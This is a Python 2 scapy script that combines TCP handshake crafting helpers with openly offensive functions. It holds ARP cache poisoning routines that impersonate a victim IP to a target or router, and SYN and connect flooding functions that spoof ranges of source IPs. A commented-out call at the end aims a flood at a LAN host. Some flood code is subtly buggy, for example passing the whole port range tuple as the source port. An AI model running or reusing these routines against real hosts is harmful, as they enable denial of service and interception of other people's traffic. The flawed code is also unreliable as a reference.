#!/usr/bin/env python
import threading,time
from scapy import *



def arp_stateMachine_thread(victim, iface, verbose=None):
    while 1:
        a=sniff(1, lfilter=lambda x: x.haslayer(Ether) and x.haslayer(ARP) and x[ARP].pdst==victim and x[ARP].op==1)
        p = Ether(src=get_if_hwaddr(iface), dst=a[0][Ether].src)/ARP(op="is-at", psrc=victim, pdst=a[0][ARP].psrc, hwsrc=get_if_hwaddr(iface), hwdst=a[0][Ether].src)
        sendp(p, iface=iface, verbose=0)
        if verbose >= 1:
            os.write(1,"sent ARP Reply Packet to " + a[0][ARP].psrc + " for " + victim + "\n")

def arp_stateMachine(victim, iface, verbose=None):
    t = threading.Thread(target=arp_stateMachine_thread,args=(victim, iface, verbose))
    t.start()

    
def arpcachepoison2_reply(target, victim, verbose=None):
    while 1:
        a=sniff(1, lfilter=lambda x: x.haslayer(Ether) and x.haslayer(ARP) and x[ARP].pdst==victim and x[ARP].op==1)
        tmac = getmacbyip(target)
        #p = Ether(dst=a[0][Ether].src)/ARP(op="is-at", psrc=victim, pdst=a[0][ARP].psrc)
        p = Ether(dst=tmac)/ARP(op="is-at", psrc=victim, pdst=target, hwdst=tmac)
        sendp(p, iface_hint=target, verbose=0)
        if verbose >= 1:
            os.write(1,"sent ARP Reply Packet to " + target + " for " + victim + "\n")
        
def arpcachepoison2(target, victim, verbose=None, interval=10):
    """ARP Cache poisoning : arpcachepoison2(target, victim, verbose=None, interval=10) -> None
    target: IP Address of the Target to cache poison 
    victim: IP Address to cache 
    verbose: indicate the verbose mode
    poison: interval (ms) between ARP cache poisoning procedure"""

    t = threading.Thread(target=arpcachepoison2_reply,args=(target, victim, verbose))
    t.start()
    tmac = getmacbyip(target)
    p = Ether(dst=tmac)/ARP(op="who-has", psrc=victim, pdst=target)
    #p.show2()
    
    while 1:        
        sendp(p, iface_hint=target, verbose=0)
        if verbose >= 1:
            os.write(1,"sent ARP Poisoning Packet to " + target + " for " + victim + "\n")

        time.sleep(interval)


def arpcachepoison2Thread(ipHost, ipRouter):
    t = threading.Thread(target=arpcachepoison2,args=(ipRouter,ipHost))
    t.start()
 


conf.verb=2

def synFlooding (ipDst, portDst, ipRouter, ipSrc=None, portSrc=(1024,65535), interval=0, poison=0, poisonInterval=5, count=None, verbose=None, window=8192):
    """SYN Flood a TCP Server : synFlooding (ipDst, portDst, ipSrc=None, portSrc=(1024,65535), interval=0, poison=0, poisonInterval=5, count=None, verbose=None, window=8192) -> None
    ipDst: Destination IP 
    portDst: Destination Port
    ipSrc: Source IP 
    portSrc: Couple to indicate the Source Port range
    interval: interval (ms) between Syn Packet 
    poison: Set to 1 if ARP cache poisoning has to be done 
    poisonInterval: interval (ms) between ARP cache poisoning procedure
    count: number of tries per Syn
    verbose: indicate the verbose mode
    window: TCP Windows"""

    nb = 0;

    if verbose is None:
        verbose = conf.verb

    if(ipSrc==None):
        for pSrc in range(portSrc[0],portSrc[1]+1):
            if count is not None:
                nb += count
            else:
                nb += 1
                                
            send(IP(dst=ipDst)/TCP(dport=portDst,sport=portSrc,flags="S",window=window), verbose=0, count=count)
            if verbose >= 1:
                if count is not None:
                    os.write(1,"sent "+ str(count) +" TCP Syn Packet(s) from (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")
                else:
                    os.write(1,"sent TCP Syn Packet from (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")

            time.sleep(interval)
            
    else:
                
        ipInf = (string.atoi(string.split(ipSrc[0],".")[3]) & 0xFF )| ((string.atoi(string.split(ipSrc[0],".")[2])  & 0xFF) << 8) | ((string.atoi(string.split(ipSrc[0],".")[1]) & 0xFF ) << 16) | ((string.atoi(string.split(ipSrc[0],".")[0]) & 0xFF) << 24)

        ipSup = (string.atoi(string.split(ipSrc[1],".")[3]) & 0xFF )| ((string.atoi(string.split(ipSrc[1],".")[2])  & 0xFF) << 8) | ((string.atoi(string.split(ipSrc[1],".")[1]) & 0xFF ) << 16) | ((string.atoi(string.split(ipSrc[1],".")[0]) & 0xFF) << 24)
    
        for ip in range(ipInf, ipSup+1):
            
            ipS = str((ip >> 24) & 0xFF) + "." + str((ip >> 16) & 0xFF) + "." + str((ip >> 8) & 0xFF) + "." + str(ip & 0xFF)
            
            if (poison == 1):
                t = threading.Thread(target=arpcachepoison2,args=(ipRouter, ipS, verbose, poisonInterval))
                t.start()
                       
            for pSrc in range(portSrc[0],portSrc[1]+1):
                if count is not None:
                    nb += count
                else:
                    nb += 1
                    
                send(IP(src=ipS,dst=ipDst)/TCP(dport=portDst,sport=pSrc,flags="S",window=window), verbose=0, count=count)
                if verbose >= 1:
                    if count is not None:
                        os.write(1,"sent " + str(count) + " TCP Syn Packet(s) from " + ipS + " (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")
                    else:
                        os.write(1,"sent TCP Syn Packet from " + ipS + " (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")
                
                time.sleep(5)                


    if verbose >= 1:
        os.write(1, str(nb) + " Syn Packet(s) Sent\n")



def connectFlooding (ipDst, portDst, ipRouter, ipSrc=None, portSrc=(1024,65535), interval=0, poison=0, poisonInterval=5, count=None, verbose=None, window=8192):
    """Connect Flood a TCP Server : connectFlooding (ipDst, portDst, ipSrc=None, portSrc=(1024,65535), interval=0, poison=0, poisonInterval=5, count=None, verbose=None, window=8192) -> None
    ipDst: Destination IP 
    portDst: Destination Port
    ipSrc: Source IP 
    portSrc: Couple to indicate the Source Port range
    interval: interval (ms) between Syn Packet 
    poison: Set to 1 if ARP cache poisoning has to be done 
    poisonInterval: interval (ms) between ARP cache poisoning procedure
    count: number of tries per Syn
    verbose: indicate the verbose mode
    window: TCP Windows"""

    nb = 0;

    if verbose is None:
        verbose = conf.verb

    if(ipSrc==None):
        for pSrc in range(portSrc[0],portSrc[1]+1):
            if count is not None:
                nb += count
            else:
                nb += 1
                                
            send(IP(dst=ipDst)/TCP(dport=portDst,sport=portSrc,flags="S",window=window), verbose=0, count=count)
            if verbose >= 1:
                if count is not None:
                    os.write(1,"sent "+ str(count) +" TCP Syn Packet(s) from (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")
                else:
                    os.write(1,"sent TCP Syn Packet from (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")

            time.sleep(interval)
            
    else:
                
        ipInf = (string.atoi(string.split(ipSrc[0],".")[3]) & 0xFF )| ((string.atoi(string.split(ipSrc[0],".")[2])  & 0xFF) << 8) | ((string.atoi(string.split(ipSrc[0],".")[1]) & 0xFF ) << 16) | ((string.atoi(string.split(ipSrc[0],".")[0]) & 0xFF) << 24)

        ipSup = (string.atoi(string.split(ipSrc[1],".")[3]) & 0xFF )| ((string.atoi(string.split(ipSrc[1],".")[2])  & 0xFF) << 8) | ((string.atoi(string.split(ipSrc[1],".")[1]) & 0xFF ) << 16) | ((string.atoi(string.split(ipSrc[1],".")[0]) & 0xFF) << 24)
    
        for ip in range(ipInf, ipSup+1):
            
            ipS = str((ip >> 24) & 0xFF) + "." + str((ip >> 16) & 0xFF) + "." + str((ip >> 8) & 0xFF) + "." + str(ip & 0xFF)
            
            if (poison == 1):
                t = threading.Thread(target=arpcachepoison2,args=(ipRouter, ipS, verbose, poisonInterval))
                t.start()
                       
            for pSrc in range(portSrc[0],portSrc[1]+1):
                if count is not None:
                    nb += count
                else:
                    nb += 1

                connect_init(ipS, ipDst, pSrc, portDst, window, verbose) 
                #send(IP(src=ipS,dst=ipDst)/TCP(dport=portDst,sport=pSrc,flags="S",window=window), verbose=0, count=count)
                if verbose >= 1:
                    if count is not None:
                        os.write(1,"sent " + str(count) + " TCP Syn Packet(s) from " + ipS + " (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")
                    else:
                        os.write(1,"sent TCP Syn Packet from " + ipS + " (port " + str(pSrc) + ") to " + ipDst + " (port " + str(portDst) + ")\n")
                
                time.sleep(5)
                #p=IP(src=ipS,dst=ipDst)/TCP(dport=portDst,sport=pSrc,window=0,flags="A",ack=160)
                #send(p)


    if verbose >= 1:
        os.write(1, str(nb) + " Syn Packet(s) Sent\n")





#################################################################################################

# Send A SYN Packet with Window set
# Wait for a SYN-ACK
# and send a ACK

#################################################################################################
def connect_init_ack_packet(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    #Sniff SYN-ACK
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].sport==srcPort and x[TCP].dport==dstPort and x[TCP].flags==0x12 and x[IP].src==ipDst and x[IP].dst==ipSrc)    
    print "\nTCP SYN-ACK Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()
           
    p=IP(src=a[0][IP].dst, dst=a[0][IP].src)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="A",ack=a[0][TCP].seq+1, seq=a[0][TCP].ack)
    print "\nSend TCP ACK Packet : ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)

def connect_init(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    t=threading.Thread(target=connect_init_ack_packet,args=(ipSrc, ipDst, dstPort, srcPort, windowToSend,verbose))
    t.start()
    p=IP(src=ipSrc, dst=ipDst)/TCP(dport=dstPort,sport=srcPort, window=windowToSend,flags="S",seq=0, ack=0)
    print "\nSend TCP SYN Packet : "
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)     




#################################################################################################

# Wait for a SYN
# send a SYN-ACK Packet with Window set
# Wait for a ACK

#################################################################################################
def connect_recv_ack_packet(ipSrc, ipDst, srcPort, dstPort, verbose=None):
#Sniff ACK
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].dport==srcPort and x[TCP].sport==dstPort and x[TCP].flags==0x10 and x[IP].src==ipDst and x[IP].dst==ipSrc)    
    print "\nTCP ACK Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()


def connect_recv(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    t=threading.Thread(target=connect_recv_ack_packet,args=(ipSrc, ipDst, srcPort, dstPort, verbose))
    t.start()
    #Sniff SYN
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].dport==srcPort and x[TCP].sport==dstPort and x[TCP].flags==0x2 and x[IP].src==ipDst and x[IP].dst==ipSrc) 
    print "\nTCP SYN Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()

    p=IP(src=a[0][IP].dst, dst=a[0][IP].src, tos=5)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="SA",ack=a[0][TCP].seq+1)
    print "\nSend TCP SYN-ACK Packet : ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)



#################################################################################################

# Wait for a FIN-ACK
# send a ACK Packet with Window set
# send a FIN-ACK
# Wait for a ACK


#################################################################################################
def connect_close_recv_ack_packet(ipSrc, ipDst, srcPort, dstPort, verbose=None):
#Sniff ACK
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].dport==srcPort and x[TCP].sport==dstPort and x[TCP].flags==0x10 and x[IP].src==ipDst and x[IP].dst==ipSrc)    
    print "\nTCP ACK Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()


def connect_close_recv(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    #Sniff SYN
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].dport==srcPort and x[TCP].sport==dstPort and x[TCP].flags==0x11 and x[IP].src==ipDst and x[IP].dst==ipSrc) 
    print "\nTCP FIN-ACK Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()

    p=IP(src=a[0][IP].dst, dst=a[0][IP].src)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="A",seq=a[0][TCP].ack, ack=a[0][TCP].seq+1)
    print "\nSend TCP ACK Packet : ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)

    t=threading.Thread(target=connect_close_recv_ack_packet,args=(ipSrc, ipDst, srcPort, dstPort, verbose))
    t.start()

    p=IP(src=a[0][IP].dst, dst=a[0][IP].src)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="FA",seq=a[0][TCP].ack, ack=a[0][TCP].seq+1)
    print "\nSend TCP FIN-ACK Packet : ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)

     


#################################################################################################

# Send A FIN-ACK Packet with Window set
# Wait for a FIN-ACK (A ACK will be send prior or after, it does not matter)
# and send a ACK

#################################################################################################
def connect_close_ack_packet(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    #Sniff FIN-ACK
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].sport==srcPort and x[TCP].dport==dstPort and x[TCP].flags==0x11 and x[IP].src==ipDst and x[IP].dst==ipSrc)    
    print "\nTCP FIN-ACK Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()
           
    p=IP(src=a[0][IP].dst, dst=a[0][IP].src)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="A",ack=a[0][TCP].seq, seq=a[0][TCP].ack)
    print "\nSend TCP ACK Packet : ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)

def connect_close(ipSrc, ipDst, srcPort, dstPort, windowToSend, seqN=1, ackN=1, verbose=None):
    t=threading.Thread(target=connect_close_ack_packet,args=(ipSrc, ipDst, dstPort, srcPort, windowToSend,verbose))
    t.start()
    p=IP(src=ipSrc, dst=ipDst)/TCP(dport=dstPort,sport=srcPort, window=windowToSend,flags="FA",seq=seqN, ack=ackN)
    print "\nSend TCP FIN-ACK Packet : "
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)     



#################################################################################################

# Send A SYN Packet with Window set and TCP Options : NOP, SACKoK, MSS = 1460, Timestamp, AltChkSumOpt, EOL
# Wait for a SYN-ACK
# and send a ACK with Window set and TCP Options

#################################################################################################
def connect_init_ack_packet_with_opts(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    #Sniff SYN-ACK
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].sport==srcPort and x[TCP].dport==dstPort and x[TCP].flags==0x12 and x[IP].src==ipDst and x[IP].dst==ipSrc)    
    print "\nTCP SYN-ACK Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()
           
    p=IP(src=a[0][IP].dst, dst=a[0][IP].src)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="A",ack=a[0][TCP].seq+1, seq=a[0][TCP].ack, options=[("NOP",""),("SAckOK",""),("MSS",1460),("Timestamp",(123,0)),("WScale", 8),("AltChkSumOpt",""), ("EOL","")])
    print "\nSend TCP ACK Packet : ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)

    p=IP(src=a[0][IP].dst, dst=a[0][IP].src)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend,flags="A",seq = 12, ack=a[0][TCP].seq+537,options=[("SAck",(a[0][TCP].seq+1609,a[0][TCP].seq+2145))])
    #Wait 3s
    time.sleep(3)
    print "Send TCP ACK Packet with Sack \n";
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)



def connect_init_with_opts(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    t=threading.Thread(target=connect_init_ack_packet_with_opts,args=(ipSrc, ipDst, dstPort, srcPort, windowToSend,verbose))
    t.start()
    p=IP(src=ipSrc, dst=ipDst)/TCP(dport=dstPort,sport=srcPort, window=windowToSend,flags="S",seq=0, ack=0, options=[("NOP",""),("SAckOK",""),("MSS",1460),("Timestamp",(123,0)),("WScale", 8),("AltChkSumOpt",""), ("EOL","")])
    print "\nSend TCP SYN Packet : "
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)     



#################################################################################################

# Send A SYN Packet with Window set 
# Wait for a SYN-ACK
# send a ACK with Window set and TCP Options
# and send two TCP segments with differents TOS values
# Different TOS values are used all along the sequence

#################################################################################################
def connect_init_ack_packet_with_tos(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    #Sniff SYN-ACK
    a=sniff(1, lfilter=lambda x: x.haslayer(TCP) and x[TCP].sport==srcPort and x[TCP].dport==dstPort and x[TCP].flags==0x12 and x[IP].src==ipDst and x[IP].dst==ipSrc)    
    print "\nTCP SYN-ACK Packet Received : ";
    if verbose >= 2:
        a[0].show2()
    elif verbose >= 1:
        print a[0].summary()
           
    p=IP(src=a[0][IP].dst, dst=a[0][IP].src,tos=56)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="A",ack=a[0][TCP].seq+1, seq=a[0][TCP].ack)
    print "\nSend TCP ACK Packet with TOS=56: ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)

    p=IP(src=a[0][IP].dst, dst=a[0][IP].src,tos=57)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="A",ack=a[0][TCP].seq+1, seq=a[0][TCP].ack)/"123456789ABCDEFGHIJK"
    print "\nSend TCP ACK Packet TOS=57: ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)

    p=IP(src=a[0][IP].dst, dst=a[0][IP].src,tos=58)/TCP(dport=a[0][TCP].sport,sport=a[0][TCP].dport, window=windowToSend, flags="A",ack=a[0][TCP].seq+1, seq=a[0][TCP].ack + 20)/"123456789ABCDEFGHIJK"
    print "\nSend TCP ACK Packet TOS=58: ";    
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)



def connect_init_with_tos(ipSrc, ipDst, srcPort, dstPort, windowToSend, verbose=None):
    t=threading.Thread(target=connect_init_ack_packet_with_tos,args=(ipSrc, ipDst, dstPort, srcPort, windowToSend,verbose))
    t.start()
    p=IP(src=ipSrc, dst=ipDst, tos=55)/TCP(dport=dstPort,sport=srcPort, window=windowToSend,flags="S",seq=0, ack=0, options=[("NOP",""),("SAckOK",""),("MSS",1460),("Timestamp",(123,0)),("WScale", 8),("AltChkSumOpt",""), ("EOL","")])
    print "\nSend TCP SYN Packet : "
    if verbose >= 2:
        p.show2()
    elif verbose >= 1:
        print p.summary()
    send(p)     




#init('192.168.5.105','192.168.5.1')

if __name__ == '__main__':
    interact(mydict=globals(), mybanner="TCP checking Enabled" )
else:
    import __builtin__
    __builtin__.__dict__.update(globals())



#synFlooding("192.168.7.63",8888, ipSrc=("192.168.5.52","192.168.5.55"), portSrc=(8000,65000), interval=0, count=1, poison=1,window=8192)
#exit 




